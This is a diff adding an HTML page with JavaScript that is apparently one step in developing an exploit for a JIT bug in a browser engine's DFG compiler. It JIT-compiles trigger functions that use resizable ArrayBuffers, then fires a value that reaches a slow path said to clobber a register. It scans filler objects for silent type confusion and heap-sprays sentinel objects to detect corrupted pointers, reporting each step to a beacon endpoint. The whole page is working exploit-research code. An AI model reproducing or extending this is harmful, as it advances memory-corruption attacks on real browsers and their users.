@@ -1,0 +1,229 @@
+<!--
+  p608f: Silent corruption scan in functions 1-4
+
+  p608e confirmed: 5th resizable+fill DFG function crashes.
+
+  Question: do functions 1-4 have SILENT stack corruption?
+  Per Exodus: the slow path (operationPutByValSloppyGeneric) clobbers $rcx,
+  and the DFG-compiled PutByOffset reads a garbage stack slot.
+  If the garbage happens to be a valid pointer in fn1-4, we get type confusion.
+
+  This probe:
+  1. Compiles 4 resizable+fill functions (safe threshold)
+  2. After warmup (DFG compiled), fires 0xffffffff to trigger slow path
+  3. Checks ALL filler objects for corruption:
+     - Is .y still an object? (type check)
+     - Does .y have expected properties? (identity check)
+     - Are there unexpected properties? (pollution check)
+  4. Also checks if the TypedArray store produced correct value
+  5. Repeats the fire 100 times per function to catch probabilistic corruption
+
+  CRASH_CLASS: LOW (stays within safe threshold of 4 functions)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p608f</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+b('P608F-SILENT-CORRUPTION');
+
+// ================================================================
+// 4 trigger functions — below crash threshold
+// ================================================================
+
+function t1(sv,fo){
+    var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});
+    var ta=new Uint32Array(ab);
+    var val=0;
+    var a=fo[0];var c=fo[1];var d=fo[2];var e=fo[3];var f=fo[4];
+    ta[3]=sv;
+    a.y={};c.y={};d.y={};e.y={};f.y={};
+    val=ta[3];
+    return val;
+}
+function t2(sv,fo){
+    var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});
+    var ta=new Uint32Array(ab);
+    var val=0;
+    var a=fo[0];var c=fo[1];var d=fo[2];var e=fo[3];var f=fo[4];
+    ta[3]=sv;
+    a.y={};c.y={};d.y={};e.y={};f.y={};
+    val=ta[3];
+    return val;
+}
+function t3(sv,fo){
+    var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});
+    var ta=new Uint32Array(ab);
+    var val=0;
+    var a=fo[0];var c=fo[1];var d=fo[2];var e=fo[3];var f=fo[4];
+    ta[3]=sv;
+    a.y={};c.y={};d.y={};e.y={};f.y={};
+    val=ta[3];
+    return val;
+}
+function t4(sv,fo){
+    var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});
+    var ta=new Uint32Array(ab);
+    var val=0;
+    var a=fo[0];var c=fo[1];var d=fo[2];var e=fo[3];var f=fo[4];
+    ta[3]=sv;
+    a.y={};c.y={};d.y={};e.y={};f.y={};
+    val=ta[3];
+    return val;
+}
+
+var fns=[t1,t2,t3,t4];
+
+// ================================================================
+// PHASE 1: Warmup all 4 with safe value (DFG compile)
+// ================================================================
+b('PHASE1-WARMUP');
+for(var n=0;n<4;n++){
+    var fl=[];for(var i=0;i<8;i++)fl.push({x:1});
+    for(var i=0;i<0x1000;i++) fns[n](42,fl);
+    b('FN'+(n+1)+'-WARMED');
+}
+
+// ================================================================
+// PHASE 2: Fire 0xffffffff and deep-check fillers
+// ================================================================
+b('PHASE2-FIRE-AND-CHECK');
+
+var totalAnomalies=0;
+
+for(var n=0;n<4;n++){
+    var fnName='FN'+(n+1);
+    var anomalies=0;
+
+    for(var round=0;round<100;round++){
+        // Fresh fillers each round
+        var fl=[];
+        for(var i=0;i<8;i++) fl.push({x:1,id:i});
+
+        // Fire with 0xffffffff (slow path trigger)
+        var retVal;
+        try{
+            retVal=fns[n](0xffffffff,fl);
+        }catch(ex){
+            b(fnName+'-R'+round+'-EXCEPTION:'+ex.message);
+            anomalies++;
+            continue;
+        }
+
+        // Check return value — should be 4294967295 (0xffffffff stored, read back)
+        if(retVal!==4294967295){
+            b(fnName+'-R'+round+'-RETVAL:'+retVal+'(expected 4294967295)');
+            anomalies++;
+        }
+
+        // Check each filler
+        for(var i=0;i<5;i++){
+            var obj=fl[i];
+            // Type check
+            if(typeof obj.y!=='object'){
+                b(fnName+'-R'+round+'-FILLER'+i+'-TYPE:'+typeof obj.y);
+                anomalies++;
+            }
+            // Identity: .y should be a fresh empty object
+            if(obj.y!==undefined && obj.y!==null && typeof obj.y==='object'){
+                var keys=Object.keys(obj.y);
+                if(keys.length>0){
+                    b(fnName+'-R'+round+'-FILLER'+i+'-KEYS:'+keys.join(','));
+                    anomalies++;
+                }
+            }
+            // Original props preserved
+            if(obj.x!==1){
+                b(fnName+'-R'+round+'-FILLER'+i+'-X:'+obj.x);
+                anomalies++;
+            }
+            if(obj.id!==i){
+                b(fnName+'-R'+round+'-FILLER'+i+'-ID:'+obj.id);
+                anomalies++;
+            }
+        }
+
+        // Check fillers 5-7 (NOT used by trigger, should be untouched)
+        for(var i=5;i<8;i++){
+            if(fl[i].y!==undefined){
+                b(fnName+'-R'+round+'-EXTRA'+i+'-Y:'+typeof fl[i].y);
+                anomalies++;
+            }
+        }
+    }
+
+    b(fnName+'-RESULT:anomalies='+anomalies+'/100rounds');
+    totalAnomalies+=anomalies;
+}
+
+// ================================================================
+// PHASE 3: Same but with different non-int32 values
+// ================================================================
+b('PHASE3-VALUE-VARIANTS');
+
+var testVals=[
+    ['NaN',NaN,0],
+    ['Inf',Infinity,0],
+    ['-Inf',-Infinity,0],
+    ['2p31',2147483648,2147483648],
+    ['1.5',1.5,1],
+    ['neg1',-1,4294967295],
+    ['undef',undefined,0]
+];
+
+for(var vi=0;vi<testVals.length;vi++){
+    var vname=testVals[vi][0], vval=testVals[vi][1], expected=testVals[vi][2];
+    var fl=[];for(var i=0;i<8;i++)fl.push({x:1});
+
+    var ret;
+    try{ret=t1(vval,fl);}catch(ex){b('V-'+vname+'-EXCEPTION');continue;}
+
+    if(ret!==expected){
+        b('V-'+vname+'-RET:'+ret+'(expected '+expected+')');
+    }
+
+    var vAnom=false;
+    for(var i=0;i<5;i++){
+        if(typeof fl[i].y!=='object'){
+            b('V-'+vname+'-F'+i+':'+typeof fl[i].y);
+            vAnom=true;
+        }
+    }
+    if(!vAnom) b('V-'+vname+'-CLEAN');
+}
+
+// ================================================================
+// PHASE 4: Fire from fn4 repeatedly with spray objects
+// (If corruption replaces .y with a different object, spray to detect)
+// ================================================================
+b('PHASE4-SPRAY-DETECT');
+
+var sentinel={_sentinel:true,magic:0xDEAD};
+var sprayCount=0;
+
+for(var round=0;round<200;round++){
+    var fl=[];
+    for(var i=0;i<8;i++) fl.push({x:1});
+
+    // Pre-spray: create objects that might land in freed slots
+    var spray=[];
+    for(var s=0;s<50;s++) spray.push({_sentinel:true,magic:0xBEEF+round});
+
+    try{t4(0xffffffff,fl);}catch(ex){b('P4-EXCEPTION-R'+round);break;}
+
+    for(var i=0;i<5;i++){
+        if(typeof fl[i].y==='object' && fl[i].y!==null && fl[i].y._sentinel===true){
+            b('P4-SPRAY-HIT:R'+round+'-F'+i+'-magic='+fl[i].y.magic);
+            sprayCount++;
+        }
+    }
+}
+b('P4-RESULT:spray_hits='+sprayCount+'/200rounds');
+
+// ================================================================
+b('TOTAL-ANOMALIES:'+totalAnomalies);
+b('P608F-COMPLETE');
+}
+
+setTimeout(main,200);
+</script></head><body>p608f: silent corruption scan</body></html>
